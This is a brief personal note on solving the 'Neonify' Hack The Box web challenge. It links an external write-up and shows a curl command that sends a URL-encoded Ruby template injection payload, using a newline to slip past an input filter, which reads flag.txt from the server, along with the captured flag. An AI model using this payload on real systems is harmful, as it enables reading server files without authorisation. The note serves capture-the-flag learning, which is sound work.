


- Used this resource to understand the vuln and breaking the ruby code

https://drt.sh/posts/htb-neonify/


```bash
─[✗]─[glack@parrot]─[~/Desktop/HTB/web_neonify/challenge/config]
└──╼ $curl http://138.68.148.72:31423/   -s -X POST -d 'neon=a
%3C%25%3D%20File.open%28%27flag.txt%27%29.read%20%25%3E' | grep -Eo 'HTB{.*}'
HTB{r3pl4c3m3n7_s3cur1ty}

```



